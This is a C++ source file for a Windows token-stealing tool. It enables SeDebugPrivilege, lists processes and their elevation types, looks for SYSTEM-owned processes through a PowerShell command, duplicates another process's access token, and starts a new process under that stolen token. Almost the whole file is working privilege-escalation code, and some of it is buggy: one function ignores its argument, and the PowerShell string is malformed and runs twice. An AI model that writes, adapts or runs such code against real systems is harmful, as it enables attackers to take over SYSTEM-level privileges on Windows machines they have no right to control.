//
// Created by ohno on 4/7/2023.
//

#include <stdexcept>
#include <iostream>
#include <tchar.h>
#include <atlconv.h>
#include "PTHandler.h"

PTHandler::PTHandler() {
//    Possiblement useless
    this->processHandle =  GetCurrentProcess();
    HANDLE tokenH;
    if (!OpenProcessToken(this -> processHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenH)) {
        std::cout << "[*] - Couldn't open current process token\n";
    }
    this -> tokenHandle = tokenH;
    DWORD tokenStatsSize = sizeof(this -> tokenStatistics);
    if (!GetTokenInformation(tokenH,
                             TokenStatistics,
                             &this -> tokenStatistics,
                             tokenStatsSize,
                             &tokenStatsSize))
    {
        throw std::runtime_error("[*] - Couldn't open current process token stats\n");
    }
}


//Open_Process
TOKEN_STATISTICS PTHandler::getProcessInformation(HANDLE pHandle) {
    HANDLE tokenH;
    if (!OpenProcessToken(pHandle,
                          TOKEN_QUERY,
                          &tokenH))
    {
        std::cout << "[*] - Couldn't open current process token???\n";
    }
    TOKEN_STATISTICS tokenStatistics;
    DWORD tokenStatsSize = sizeof(tokenStatistics);
    if (!GetTokenInformation(tokenH,
                             TokenStatistics,
                             &tokenStatistics,
                             tokenStatsSize,
                             &tokenStatsSize))
    {
        std::cout << "[*] - Couldn't get current process token statistics\n";
        CloseHandle(tokenH);
    }
    return tokenStatistics;
}

void PTHandler::showTokenInfo(HANDLE pHandle) {
    std::string impersonationLevels[] {"Anonymous", "Identification", "Impersonation", "Delegation"};
    TOKEN_STATISTICS tStats = getProcessInformation(processHandle);
    std::cout << "[*] [LUID] --> " << tStats.AuthenticationId.HighPart << tStats.AuthenticationId.LowPart << "\n";
    std::cout << "[*] [TYPE] --> " << tStats.TokenType << std::endl;
    std::cout << "[*] [Impersonation Level] --> " << impersonationLevels[tStats.ImpersonationLevel] << std::endl;
    std::cout << (isSeDebugEnabled() ? "[*] - Se_Debug Enabled :-)\n" : "[*] - Se_Debug Disabled ://\n");
}

BOOL PTHandler::enableSeDebugPrivileges() const {
    LPCTSTR seDebugPriv = SE_DEBUG_NAME;
    LUID debugPrivilegeLuid;

    if (!LookupPrivilegeValue(NULL, seDebugPriv, &debugPrivilegeLuid)) {
        std::cout << "[*] - Couldn't get LUID for SeDebugPrivilege, error : "<< GetLastError() <<"\n";
        return false;
    }

    TOKEN_PRIVILEGES tempTP;
    tempTP.PrivilegeCount = 1;
    tempTP.Privileges[0].Luid = debugPrivilegeLuid;
    tempTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(this -> tokenHandle, FALSE, &tempTP, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cout << "[*] - Couldn't adjust token privilege, error : "<< GetLastError() <<"\n";
        return false;
    }
    std::cout << "[*] - Sucessfully added needed privilege :)..\n";
    return true;
}

BOOL PTHandler::isSeDebugEnabled() {
    DWORD dwLength = getTokenPrivNeededBufferSize();
    TOKEN_PRIVILEGES* tempTP = (TOKEN_PRIVILEGES*) malloc(dwLength);
    LPCTSTR debugPriv = SE_DEBUG_NAME;
    if (!GetTokenInformation(this -> tokenHandle, TokenPrivileges, tempTP, dwLength, &dwLength)) {
        std::cerr << "Error: "  << GetLastError() << std::endl;
        CloseHandle(this -> tokenHandle);
        return false;
    }
    TCHAR privName[1024]; //Buffer for name of privilege
    for (auto i = 0 ; i < tempTP -> PrivilegeCount ; ++i) {
        DWORD privSize = sizeof(privName) / sizeof(TCHAR);
        if (LookupPrivilegeName(nullptr, &tempTP -> Privileges[i].Luid, privName, &privSize)
            && (_tcscmp(privName, debugPriv) == 0)
            && tempTP -> Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
            free(tempTP);
            return true;
        }
    }
    free(tempTP);
    return false;
}

DWORD PTHandler::getTokenPrivNeededBufferSize() {
    DWORD dwLength = 0;
    if (!GetTokenInformation(this -> tokenHandle, TokenPrivileges, nullptr, 0, &dwLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Error: "  << GetLastError() << std::endl;
        CloseHandle(this -> tokenHandle);
        return -1;
    }
    return dwLength;
}

/*void PTHandler::listExistingTokens() {
    //Listing all system handles
}*/
PTHandler::~PTHandler() {
    CloseHandle(processHandle);
    CloseHandle(tokenHandle);
    std::cout << "Cya later cowboy ;)\n";
}

/**
 * @brief PTHandler::printAdminProcessesDep
 * @details Prints all processes with admin privileges
 * @attention DEPRECATED (Non admin processes cannot be enumerated)
 */
void PTHandler::printAdminProcessesDep() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        std::cout << "[*] - Couldn't enumerate processes, error: " << GetLastError() << std::endl;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    std::cout << "[*] - Number of processes: " << cProcesses << std::endl;
    std::cout << "[*] - Process ID | Process Name | Process Priority | Elevation Type" << std::endl;
    for(size_t i = 0 ; i < cProcesses ; ++i) {
        if (aProcesses[i] != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            if (hProcess) {
//                if (isProcessAdmin(hProcess)) {
                printProcessIdNamePriorityAndElevationType(aProcesses[i]);
//                }
                CloseHandle(hProcess);
            }
        }
    }
}
//Same as before but this time using windows Snapshot
void PTHandler::printAdminProcesses() {
    HANDLE hProcessSnap;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cout << "[*] - Couldn't create process snapshot, error: " << GetLastError() << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        std::cout << "[*] - Couldn't get first process, error: " << GetLastError() << std::endl;
        CloseHandle(hProcessSnap);
        return;
    }
    std::cout << "[*] - Process ID | Process Name | Process Priority | Elevation Type" << std::endl;
    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
        if (hProcess) {
//            if (isProcessAdmin(hProcess)) {
                printProcessIdNamePriorityAndElevationType(pe32.th32ProcessID);
//            }
            CloseHandle(hProcess);
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
}

void PTHandler::printProcessIdNamePriorityAndElevationType(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess) {
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hProcess, &hMod, sizeof(HMODULE), &cbNeeded) == 0) {
            std::cout << "[*] - Couldn't enumerate process modules for pid: " << processID << ", error: " << GetLastError() << std::endl;
            CloseHandle(hProcess);
            return;
        }
        char processName[1024];
        if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(char)) == 0) {
            std::cout << "[*] - Couldn't get process name, error: " << GetLastError() << std::endl;
            CloseHandle(hProcess);
            return;
        }
        std::cout << "[*] - " << processID << " | ";
        std::cout << processName << " | ";
        std::cout << priorityClassToString(GetPriorityClass(hProcess)) << " | ";
        HANDLE hToken;
        if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken) == 0) {
            std::cout << "[*] - Couldn't open process token, error: " << GetLastError() << std::endl;
            CloseHandle(hProcess);
            return;
        }
        TOKEN_ELEVATION_TYPE elevationType;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize) == 0) {
            std::cout << "[*] - Couldn't get token elevation type, error: " << GetLastError() << std::endl;
            CloseHandle(hProcess);
            return;
        }
        std::cout << elevationTypeToString(elevationType) << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
    }
}

std::string PTHandler::priorityClassToString(DWORD priorityClass) {
    switch (priorityClass) {
        case IDLE_PRIORITY_CLASS:
            return "IDLE_PRIORITY";
        case BELOW_NORMAL_PRIORITY_CLASS:
            return "BELOW_NORMAL_PRIORITY";
        case NORMAL_PRIORITY_CLASS:
            return "NORMAL_PRIORITY";
        case ABOVE_NORMAL_PRIORITY_CLASS:
            return "ABOVE_NORMAL_PRIORITY";
        case HIGH_PRIORITY_CLASS:
            return "HIGH_PRIORITY";
        case REALTIME_PRIORITY_CLASS:
            return "REALTIME_PRIORITY";
        default:
            return "UNKNOWN_PRIORITY";
    }
}

std::string PTHandler::elevationTypeToString(TOKEN_ELEVATION_TYPE elevationType) {
    switch (elevationType) {
        case TokenElevationTypeDefault :
            return "DEFAULT";
        case TokenElevationTypeFull :
            return "FULL";
        case TokenElevationTypeLimited :
            return "LIMITED";
        default:
            return "UNKNOWN";
    }
}

BOOL PTHandler::isProcessAdmin(HANDLE hProcess) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        std::cerr << "Error: "  << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    TOKEN_ELEVATION_TYPE elevationType;
    DWORD dwSize;
    if (!GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize)) {
        std::cout << "Couldn't get process's token info , error: " << GetLastError() << std::endl;
        return false;
    }
    return elevationType == TokenElevationTypeFull;
}

/**
 * @param processID
 * @return TokenHandle for duplicated token if successful, nullptr otherwise
 */
HANDLE PTHandler::stealTokenFromProcess(DWORD processID) {
    HANDLE stolenToken = nullptr;
    SECURITY_IMPERSONATION_LEVEL impersonationLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE hProcess;
    HANDLE hToken;
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID) ;
    if (!hProcess) {
        std::cout << "[*] - Couldn't open process, error: " << GetLastError() << std::endl;
        return nullptr;
    }
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        std::cout << "[*] - Couldn't open process token, error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return nullptr;
    }
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, impersonationLevel, tokenType, &stolenToken)) {
        std::cout << "[*] - Couldn't duplicate token, error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return nullptr;
    }
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return stolenToken;
}


void PTHandler::createProcessWithToken(HANDLE stolenToken, const std::string &processPath) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};

    int size = MultiByteToWideChar(CP_UTF8, 0, processPath.c_str(), static_cast<int>(processPath.length()), nullptr, 0);
    std::wstring ws(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, processPath.c_str(), static_cast<int>(processPath.length()), &ws[0], size);
    LPWSTR lpApplicationName = const_cast<LPWSTR>(ws.c_str());
    if(!CreateProcessWithTokenW(stolenToken, 0, lpApplicationName, nullptr, 0, nullptr, nullptr, &si, &pi)) {
        std::cout << "[*] - Couldn't create process with stolen token, error: " << GetLastError() << std::endl;
        CloseHandle(stolenToken);
        return;
    }
    CloseHandle(stolenToken);
    std::cout << "[*] - Process created successfully!" << std::endl;
    std::cout << "[*] - Current process info : " << std::endl;
    showTokenInfo(GetCurrentProcess());
    std::cout << "[*] - Process with stolen token info : " << std::endl;
    showTokenInfo(pi.hProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}

void PTHandler::fetchAdminTokensThroughPowershell(const std::string& outputPath) {
    std::string command = R"(powershell.exe -Command "Get-Process -IncludeUserName | Select-Object -Property Id,UserName | Where-Object { $_.UserName -eq "NT AUTHORITY\SYSTEM" })" + outputPath + "\"";
    system(command.c_str());
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcess(nullptr, const_cast<LPSTR>(command.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cout << "[*] - Couldn't create powershell process, error: " << GetLastError() << std::endl;
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}











